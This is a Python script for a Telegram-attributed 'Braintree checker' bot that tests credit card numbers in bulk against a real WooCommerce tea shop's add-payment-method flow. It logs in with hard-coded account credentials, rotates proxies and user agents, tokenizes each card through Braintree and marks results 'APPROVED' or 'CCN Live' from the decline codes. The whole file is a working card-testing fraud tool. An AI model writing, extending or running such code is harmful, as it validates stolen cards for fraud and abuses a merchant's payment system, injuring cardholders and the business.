import httpx
import re
import random
import base64
import asyncio
import time
import os
import json
from user_agent import generate_user_agent

class BraintreeChecker:
    def __init__(self):
        self.accounts = []
        self.proxies = []
        self.current_account_index = 0
        self.current_proxy_index = 0
        self.session_delay = 1
        
    def load_accounts(self):
        """Load accounts from the code or file"""
        self.accounts = [
            {"email": "atomicguillemette@tiffincrane.com", "password": "Simon99007"},
            {"email": "verbalmarti@tiffincrane.com", "password": "Simon99007"},
            {"email": "deeannewasteful@tiffincrane.com", "password": "Simon99007"},
            {"email": "blue8874@tiffincrane.com", "password": "Simon99007"},
            {"email": "homely120@tiffincrane.com", "password": "Simon99007"},
            {"email": "7576olga@tiffincrane.com", "password": "Simon99007"},
            {"email": "grubbyflorina@tiffincrane.com", "password": "Simon99007"}
        ]
    
    def load_proxies(self):
        """Load proxies from file"""
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        return self.proxies
    
    def get_next_account(self):
        """Get next account with rotation"""
        if not self.accounts:
            return None
        
        account = self.accounts[self.current_account_index]
        self.current_account_index = (self.current_account_index + 1) % len(self.accounts)
        return account
    
    def get_next_proxy(self):
        """Get next proxy with rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def parse_proxy(self, proxy_str):
        """Parse proxy string to httpx format"""
        try:
            if ":" in proxy_str:
                parts = proxy_str.split(":")
                if len(parts) == 4:
                    # Format: ip:port:username:password
                    ip, port, username, password = parts
                    return f"http://{username}:{password}@{ip}:{port}"
                elif len(parts) == 2:
                    # Format: ip:port
                    ip, port = parts
                    return f"http://{ip}:{port}"
        except:
            pass
        return None
    
    def get_bin_info(self, bin_number):
        """Simple BIN lookup"""
        if not bin_number or len(bin_number) < 6:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown', 
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': ''
            }
        
        try:
            response = httpx.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data and data.get('scheme'):
                    return {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown').upper(),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': data.get('country', {}).get('emoji', '')
                    }
        except:
            pass
        
        # Fallback pattern matching
        if bin_number.startswith('4'):
            brand = 'VISA'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
        else:
            brand = 'UNKNOWN'
        
        return {
            'bank': f"{brand} BANK",
            'country': 'Unknown',
            'brand': brand,
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }

    def extract_processor_response(self, error_text):
        """Extract processor response from Braintree error with enhanced parsing"""
        try:
            # Enhanced JSON parsing for Braintree errors
            if '"processorResponse":' in error_text:
                processor_match = re.search(r'"processorResponse":\s*\{[^}]*"code":"(\d+)"[^}]*"message":"([^"]+)"', error_text)
                if processor_match:
                    code = processor_match.group(1)
                    message = processor_match.group(2).replace('\\"', '"')
                    return {'code': code, 'message': message}
            
            # Look for direct processor response codes
            direct_code_match = re.search(r'"code":"?(\d{4})"?', error_text)
            if direct_code_match:
                code = direct_code_match.group(1)
                # Try to find corresponding message
                message_match = re.search(r'"message":"([^"]+)"', error_text)
                message = message_match.group(1).replace('\\"', '"') if message_match else 'Processor Response'
                return {'code': code, 'message': message}
            
            # Look for gatewayRejectionReason
            rejection_match = re.search(r'"gatewayRejectionReason":"([^"]+)"', error_text)
            if rejection_match:
                reason = rejection_match.group(1)
                return {'code': 'GATEWAY', 'message': f'Gateway Rejection: {reason}'}
                
            # Look for verification status
            cvv_match = re.search(r'"cvv":"([^"]+)"', error_text)
            avs_match = re.search(r'"avs":"([^"]+)"', error_text)
            if cvv_match or avs_match:
                cvv_status = cvv_match.group(1) if cvv_match else 'Not checked'
                avs_status = avs_match.group(1) if avs_match else 'Not checked'
                return {'code': 'VERIFICATION', 'message': f'CVV: {cvv_status}, AVS: {avs_status}'}
                
        except Exception as e:
            pass
        return None

    def extract_braintree_code(self, error_text):
        """Extract Braintree error code and message with enhanced detection"""
        # Comprehensive Braintree processor response codes
        braintree_codes = {
            '2000': 'Do Not Honor',
            '2001': 'Insufficient Funds',
            '2002': 'Lost Card',
            '2003': 'Stolen Card', 
            '2004': 'Expired Card',
            '2005': 'Invalid Card Number',
            '2006': 'Invalid Expiration Date',
            '2007': 'No Account',
            '2008': 'Card Account Length Error',
            '2009': 'No Such Issuer',
            '2010': 'Card Issuer Declined CVV',
            '2011': 'Voice Authorization Required',
            '2012': 'Processing Error',
            '2013': 'Invalid Merchant',
            '2014': 'Pick Up Card',
            '2015': 'Account Not Found',
            '2016': 'Amount Error',
            '2017': 'Security Violation',
            '2018': 'Merchant Closed',
            '2019': 'Restricted Card',
            '2020': 'Call Issuer',
            '2021': 'Invalid PIN',
            '2022': 'Invalid ZIP',
            '2023': 'Invalid Address',
            '2024': 'Invalid CVV',
            '2030': 'Invalid Security Code',
            '2031': 'Card Not Activated',
            '2032': 'Maximum Pin Retries Exceeded',
            '2033': 'Invalid Transaction',
            '2034': 'Transaction Not Allowed',
            '2035': 'Unsupported Card',
            '2036': 'Invalid Currency',
            '2037': 'Invalid Amount',
            '2038': 'Duplicate Transaction',
            '2039': 'Suspected Fraud',
            '2040': 'Service Not Supported',
            '2041': 'Timeout',
            '2042': 'Issuer Unavailable',
            '2043': 'System Error',
            '2044': 'Declined - Call Issuer',
            '2045': 'Declined - Invalid Merchant',
            '2046': 'Declined - Restricted Card',
            '2047': 'Declined - Invalid Account',
            '2048': 'Declined - Invalid Amount',
            '2049': 'Declined - Invalid Transaction',
            '2050': 'Declined - Duplicate Transaction',
            '2051': 'Declined - Suspected Fraud',
            '2052': 'Declined - Security Violation',
            '2053': 'Declined - Card Not Supported',
            '2054': 'Declined - Expired Card',
            '2055': 'Declined - Invalid PIN',
            '2056': 'Declined - Transaction Not Permitted',
            '2057': 'Declined - Limit Exceeded',
            '2058': 'Declined - Invalid Security Code',
            '2059': 'Declined - Suspected Fraud',
            '3000': 'Processor Network Unavailable'
        }
        
        # Try to extract exact code from error text
        for code, message in braintree_codes.items():
            if f'"code":"{code}"' in error_text or f'"{code}"' in error_text or code in error_text:
                return code, message
        
        # Enhanced pattern matching for common errors
        error_lower = error_text.lower()
        
        if any(term in error_lower for term in ['cvv', 'security code', 'cvc', 'verification failed']):
            return '2010', 'Card Issuer Declined CVV'
        elif any(term in error_lower for term in ['insufficient', 'funds', '2001']):
            return '2001', 'Insufficient Funds'
        elif any(term in error_lower for term in ['expired', '2004']):
            return '2004', 'Expired Card'
        elif any(term in error_lower for term in ['do not honor', '2000']):
            return '2000', 'Do Not Honor'
        elif any(term in error_lower for term in ['invalid number', '2005']):
            return '2005', 'Invalid Card Number'
        elif any(term in error_lower for term in ['stolen', 'lost', '2002', '2003']):
            return '2003', 'Stolen Card'
        elif any(term in error_lower for term in ['pick up', '2014']):
            return '2014', 'Pick Up Card'
        elif any(term in error_lower for term in ['restricted', '2019']):
            return '2019', 'Restricted Card'
        elif any(term in error_lower for term in ['invalid expiration', '2006']):
            return '2006', 'Invalid Expiration Date'
        elif any(term in error_lower for term in ['no such issuer', '2009']):
            return '2009', 'No Such Issuer'
        elif any(term in error_lower for term in ['call issuer', '2020']):
            return '2020', 'Call Issuer'
        elif any(term in error_lower for term in ['suspected fraud', '2039', '2051']):
            return '2039', 'Suspected Fraud'
        
        return None, None

    def extract_generic_response(self, error_text):
        """Extract generic response when no specific code found with enhanced parsing"""
        try:
            # Try to parse JSON error
            if error_text.strip():
                error_json = json.loads(error_text)
                if 'errors' in error_json:
                    if isinstance(error_json['errors'], list) and error_json['errors']:
                        error_msg = error_json['errors'][0].get('message', 'Unknown error')
                        return f'Braintree: {error_msg}'
                elif 'message' in error_json:
                    return f'Braintree: {error_json["message"]}'
                elif 'error' in error_json:
                    return f'Braintree: {error_json["error"]}'
        except:
            pass
        
        # Enhanced regex patterns for error extraction
        patterns = [
            r'"message":"([^"]+)"',
            r'"error":"([^"]+)"',
            r'"description":"([^"]+)"',
            r'<title>([^<]+)</title>',
            r'class="[^"]*error[^"]*">([^<]+)',
            r'Error:\s*([^<]+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            if matches:
                for match in matches:
                    if match and len(match.strip()) > 5:  # Meaningful message
                        return f'Processor: {match.strip()}'
        
        # Fallback to simple text extraction
        if 'declined' in error_text.lower():
            return 'Processor: Transaction declined'
        elif 'error' in error_text.lower():
            return 'Processor: System error'
        elif 'invalid' in error_text.lower():
            return 'Processor: Invalid card data'
        elif 'failed' in error_text.lower():
            return 'Processor: Transaction failed'
        
        return 'Processor: Transaction declined'

    def extract_site_error(self, response_text):
        """Extract error message from site response with enhanced parsing"""
        try:
            # WooCommerce error extraction
            error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL | re.IGNORECASE)
            if error_match:
                return error_match.group(1).strip()
            
            # Alternative WooCommerce error patterns
            error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL | re.IGNORECASE)
            if error_match:
                error_content = error_match.group(1)
                li_matches = re.findall(r'<li>(.*?)</li>', error_content, re.IGNORECASE)
                if li_matches:
                    return li_matches[0]
            
            # General error message patterns
            error_patterns = [
                r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
                r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
                r'<span[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</span>',
                r'Error:\s*<strong>(.*?)</strong>',
                r'alert[^>]*>(.*?)</div>',
            ]
            
            for pattern in error_patterns:
                matches = re.findall(pattern, response_text, re.DOTALL | re.IGNORECASE)
                if matches:
                    clean_match = re.sub('<[^>]+>', '', matches[0]).strip()
                    if clean_match and len(clean_match) > 3:
                        return clean_match
                    
        except Exception as e:
            pass
        
        return 'Payment declined by merchant'
    
    async def check_single_card(self, card_line):
        """Check a single card with account rotation"""
        start_time = time.time()
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            n, mm, yy, cvc = parts
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" not in yy:
                yy = f'20{yy}'
            
            # Get account and proxy
            account = self.get_next_account()
            if not account:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No accounts available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            proxy_str = self.get_next_proxy()
            proxies = self.parse_proxy(proxy_str) if proxy_str else None
            
            # Process card
            result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
            elapsed_time = time.time() - start_time
            
            # Get BIN info
            bin_info = self.get_bin_info(n[:6])
            
            # Format result based on response
            if result == "APPROVED":
                return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
        """Process a single card with given account and proxy"""
        try:
            user = generate_user_agent()
            
            # Configure proxy if available
            transport = None
            if proxies:
                transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
            
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=30,
                transport=transport
            ) as client:
                headers = {
                    'authority': 'www.tea-and-coffee.com',
                    'user-agent': user,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                }
                
                # Step 1: Get login page
                response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
                
                # Find login nonce
                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
                if not login_nonce_match:
                    return 'DECLINED', 'Could not find login nonce'
                
                nonce = login_nonce_match.group(1)

                # Step 2: Login with account credentials
                data = {
                    'username': account['email'],
                    'password': account['password'],
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/account/',
                    'login': 'Log in',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/',
                    headers=headers,
                    data=data
                )
                
                # Check if login was successful
                if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
                    return 'DECLINED', 'Login failed'
                
                # Step 3: Navigate to add payment method
                headers.update({
                    'referer': 'https://www.tea-and-coffee.com/account/',
                })
                
                # Try custom payment method page first
                response = await client.get(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    headers=headers
                )

                if response.status_code != 200:
                    response = await client.get(
                        'https://www.tea-and-coffee.com/account/add-payment-method/',
                        headers=headers
                    )

                # Find payment nonce
                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
                if not payment_nonce_match:
                    return 'DECLINED', 'Could not find payment nonce'
                
                nonce = payment_nonce_match.group(1)

                # Find client nonce for Braintree
                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                if not client_nonce_match:
                    return 'DECLINED', 'Could not find client token nonce'
                
                client_nonce = client_nonce_match.group(1)
                
                headers.update({
                    'x-requested-with': 'XMLHttpRequest',
                    'referer': str(response.url),
                })

                # Step 4: Get client token
                data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': client_nonce,
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    headers=headers,
                    data=data
                )
                
                if 'data' not in response.json():
                    return 'DECLINED', 'No data in client token response'
                    
                enc = response.json()['data']
                dec = base64.b64decode(enc).decode('utf-8')
                
                # Find authorization
                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                if not authorization_match:
                    return 'DECLINED', 'Could not find authorization fingerprint'
                authorization = authorization_match[0]

                # Step 5: Tokenize card - THIS IS WHERE WE GET DETAILED RESPONSES
                headersn = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': user,
                }

                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(random.randint(1000000000, 9999999999)),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                }
                
                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=headersn,
                    json=json_data
                )

                response_data = response.json()
                error_text = response.text

                # Check tokenization response
                if 'data' not in response_data or 'tokenizeCreditCard' not in response_data['data']:
                    # Enhanced error extraction with detailed processor responses
                    processor_response = self.extract_processor_response(error_text)
                    if processor_response:
                        code = processor_response['code']
                        message = processor_response['message']
                        
                        # Determine if this is an APPROVED or DECLINED scenario
                        # CVV related codes - APPROVED for card testing
                        if code in ['2010', '2011', '2024', '2030', '2058'] or any(term in message.lower() for term in ['cvv', 'security code', 'cvc', 'verification']):
                            return 'APPROVED', f'{code}: {message} (CCN Live)'
                        # Specific approved scenarios for card testing
                        elif code in ['2000', '2001', '2004', '2005', '2006', '2019']:
                            return 'APPROVED', f'{code}: {message}'
                        # Hard declines
                        elif code in ['2002', '2003', '2007', '2009', '2014', '2039', '2051']:
                            return 'DECLINED', f'{code}: {message}'
                        else:
                            return 'DECLINED', f'{code}: {message}'
                    
                    # Fallback to manual code extraction
                    braintree_code, braintree_message = self.extract_braintree_code(error_text)
                    if braintree_code and braintree_message:
                        if any(term in braintree_message.lower() for term in ['cvv', 'security code', 'cvc', 'verification']):
                            return 'APPROVED', f'{braintree_code}: {braintree_message} (CCN Live)'
                        elif braintree_code in ['2000', '2001', '2004', '2005', '2006']:
                            return 'APPROVED', f'{braintree_code}: {braintree_message}'
                        else:
                            return 'DECLINED', f'{braintree_code}: {braintree_message}'
                    
                    # If no specific code found, use enhanced generic extraction
                    return 'DECLINED', self.extract_generic_response(error_text)
                        
                tok = response_data['data']['tokenizeCreditCard']['token']

                # Step 6: Process payment
                current_url_str = str(response.url)
                if 'add-payment-method-custom' in current_url_str:
                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                    wp_referer = '/account/add-payment-method-custom/'
                else:
                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                    wp_referer = '/account/add-payment-method/'

                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.tea-and-coffee.com',
                    'referer': referer,
                    'user-agent': user,
                }

                data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': 'visa',
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                    'wc_braintree_credit_card_payment_nonce': tok,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': wp_referer,
                    'woocommerce_add_payment_method': '1',
                }
                
                response = await client.post(
                    endpoint,
                    headers=headers,
                    data=data
                )
                
                response_text = response.text
                
                # Enhanced success detection
                success_indicators = [
                    'Payment method successfully added',
                    'payment method added successfully',
                    'payment-method-added',
                    'payment method saved',
                    'card added successfully',
                    'payment method has been added',
                    'successfully added',
                    'woocommerce-message',  # WooCommerce success message class
                    'updated successfully',
                    'saved successfully'
                ]
                
                # Check for success
                for indicator in success_indicators:
                    if indicator.lower() in response_text.lower():
                        return 'APPROVED', 'Payment method successfully added'
                
                # Check for WooCommerce success message
                if 'woocommerce-message' in response_text and 'error' not in response_text.lower():
                    # Extract success message from WooCommerce
                    success_match = re.search(r'woocommerce-message[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL)
                    if success_match:
                        success_msg = success_match.group(1).strip()
                        return 'APPROVED', f'Site: {success_msg}'
                    else:
                        return 'APPROVED', 'Payment method added successfully'
                
                # Check URL for success (redirect to payment methods page)
                if 'payment-methods' in str(response.url) or 'account' in str(response.url):
                    return 'APPROVED', 'Payment method added successfully'
                
                # Check for error
                elif 'woocommerce-error' in response_text:
                    site_error = self.extract_site_error(response_text)
                    if site_error:
                        if any(term in site_error.lower() for term in ['cvv', 'security code', 'cvc']):
                            return 'APPROVED', f'Site: {site_error} (CCN Live)'
                        else:
                            return 'DECLINED', f'Site: {site_error}'
                    return "DECLINED", 'Site: Payment declined'
                
                else:
                    return "DECLINED", 'Processor: Transaction declined'

        except Exception as e:
            return 'DECLINED', f'Error: {str(e)}'

# Global checker instance
braintree_checker = BraintreeChecker()

def initialize_braintree():
    """Initialize the Braintree checker"""
    braintree_checker.load_accounts()
    braintree_checker.load_proxies()
    return "✅ Braintree checker initialized"

async def check_card_braintree(cc_line):
    """Main function to check card via Braintree (single card)"""
    return await braintree_checker.check_single_card(cc_line)

async def check_cards_braintree(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = await check_card_braintree(cc_line)
        results.append(result)
        await asyncio.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Initialize the checker
    initialize_braintree()
    
    # Test with a single card
    async def test():
        test_cc = "4111111111111111|12|2025|123"
        print("Testing Braintree checker...")
        result = await check_card_braintree(test_cc)
        print(result)
    
    asyncio.run(test())
